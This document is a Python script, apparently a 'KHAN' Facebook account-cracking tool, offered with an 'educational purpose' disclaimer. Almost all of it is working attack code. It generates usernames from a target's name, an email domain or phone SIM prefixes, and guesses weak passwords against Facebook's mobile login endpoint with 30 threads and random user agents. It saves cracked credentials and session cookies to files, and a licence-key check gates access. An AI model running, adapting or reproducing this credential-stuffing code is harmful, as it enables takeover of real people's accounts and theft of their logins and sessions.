#!/usr/bin/python
#The Credit For This Code Goes To KHAN-BROTHER
#This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.
#This tool works on both rooted Android device and Non-rooted Android device.
#Don't try to edit or modify this tool. 


import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    
    
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)


logo = ("""

\033[1;92m
  ██   ██ ██   ██  █████  ███    ██ 
  ██  ██  ██   ██ ██   ██ ████   ██ 
  █████   ███████ ███████ ██ ██  ██ 
  ██  ██  ██   ██ ██   ██ ██  ██ ██ 
  ██   ██ ██   ██ ██   ██ ██   ████ 
  
 \033[1;91m\033[1;41m\033[1;97m  IT’S NOT JUST A NAME. IT'S A BRAND  \033[;0m\033[1;91m\033[1;92m       
                                                                       
\033[38;5;6m ╔═══════════════════════════════════════════════╗
 \033[38;5;6m║  \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mKHAN OFFICIAL (rakib)  \033[38;5;6m  ║
 \033[38;5;6m║  \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195m Mr.KhanVau420 \033[38;5;6m           ║
 \033[38;5;6m║  \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mKhanBrother420  \033[38;5;6m         ║
 \033[38;5;6m║  \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mTOOL STATUS  \033[38;5;196m: \033[38;5;195m Mix Clone              \033[38;5;6m  ║
 \033[38;5;6m║  \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195mKBT                    \033[38;5;6m  ║
 \033[38;5;6m║  \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mTOOL VIRSION \033[38;5;196m:  \033[38;5;195m2.0                    \033[38;5;6m  ║
 \033[38;5;6m╚═══════════════════════════════════════════════╝
	                              
\033[1;95m                                             
          _______           
      .adOOOOOOOOOba.
     dOOOOOOOOOOOOOOOb
    dOOOOOOOOOOOOOOOOOb
   dOOOOOOOOOOOOOOOOOOOb
  |OOOOOOOOOOOOOOOOOOOOO|
  OP'~"YOOOOOOOOOOOP"~`YO
  OO     `YOOOOOP'     OO
  OOb   ●  `OOO' ●   dOO
  YOOo      OOO      oOOP \033[1;97mMr.Khan-Other's planet\033[1;96m  
  `OOOo     OOO     oOOO'
   `OOOb._,dOOOb._,dOOO'
    `OOOOOOOOOOOOOOOOO'
     OOOOOOOoOoOOOOOOO 
     YOOOOOOOOOOOOOOOP
     `OOOOOI```IOOOOO'
      `OOOOI,,,IOOOO'
       `OOOOOOOOOOO'
         `~OOOOO~'

\033[1;91m<═══\033[1;41m\033[1;97mI  am  S y s t e m  maker \033[;0m\033[1;91m═══>\033[1;92m""")


try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="Khan"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get(" https://github.com/khanbrother420/Premium-2.0/blob/main/Approval.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    print
	
	
	
	
	
	
	
	
	
	
	
    print("Your key  : "+key2)
    print("\n\t\tContact Admin Type👉 python Premium.py ⚠ Enter ")
	
	
    os.system('xdg-open https://www.facebook.com/Mr.KhanVau420')
    exit()

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(" \033[1;97m[1] FACEBOOK EMAIL ID HACK     \033[1;93m[WORKING] ")
        print(" \033[1;97m[2] FACEBOOK USERNAME HACK      \033[1;35m[BEST]")
        print(" \033[1;97m[3] FACEBOOK VIP RANDOM HACK   \033[1;32m[FIRE]")
	
        print(" \033[1;97m[0] Exit")
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
	
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [🔥]  TERGET FIRST NAME : ')
    kodex = input(' [🔥] TERGET LAST NAME :  ')
    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(' [📧]  Input Doamin  : ')
    limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;94m[⚙️]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;94m [⚙️]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;94m[⚙️]  The process has been started')
        print(' \033[1;94m[⚙️]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [✅] Crack process has been completed')
    print(' [📝] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [❤️‍🔥]  TERGET FIRST NAME : ')
    kodex = input(' [❤️‍🔥] TERGET LAST NAME :  ')
    doamin = '.'
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;94m[⚙️]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;94m [⚙️]  Target Doamin:\033[1;92m Facebook Hacking(\033[1;35mFast)")
        print(' \033[1;94m[⚙️]  The process has been started')
        print(' \033[1;94m[⚙️]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [✅] Crack process has been completed')
    print(' [📝] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v3():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID HACKED")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    
    kode = input(' [📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' VIP '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;94m[⚙️]  TOTAL IDS :\033[1;92m '+tl)
        print(f"\033[1;94m [⚙️]  YOUR TERGET HACK MENU:\033[1;92m {doamin}")
        print(' \033[1;94m[⚙️]  THE HACK PROCESS HAS BEEN STARTED')
        print(' \033[1;94m[⚙️]  WAIT FOR IDS ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [✅] Crack process has been completed')
    print(' [📝] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'p.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'application/x-www-form-urlencoded',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://p.facebook.com/',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'empty',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[KHAN-OK🥰] {uid}|{ps}")
                print(f"\n[COOKIE👽] : {coki}")
                open('/sdcard/KHAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[KHAN-CP🥺] {uid}|{ps}")
                open('/sdcard/KHAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1       
        brand=random.choice(['KHAN CYBER','KHAN CYBER ','KHAN CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['🔴','🟠','🟡','🔵','🟢','🟣','🟤','⚫','⚪','🔴','🟠','🟡','🔵','🟢','🔴🟣','🟤','⚫','⚪','🔴','🟠','🟡','🔵','🟢','🟣','🟤','⚫','⚪','🔴','🟠',' 🟡','🔵','🟢','🟣','⚫','⚪','🟤','🔴','🟠','🔵','🟡','🟢','🟣','⚫','⚪','🟤','⚫','🔴','🟠','🔵','🟡','🟢','🟣','⚫','⚪','🟤','🔴','🟠','🔵','🟡','🟢','⚪','⚫','🟣','🟤','🟠','🔴','🔵','🟡','🟢','⚪','⚫','🟡','🟣','🔵','🔴','✨'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}𝗞𝗛𝗔𝗡👑𝗖𝗬𝗕𝗘𝗥💦\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}𝗞𝗛𝗔𝗡🌸𝗕𝗥𝗢𝗧𝗛𝗘𝗥 {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
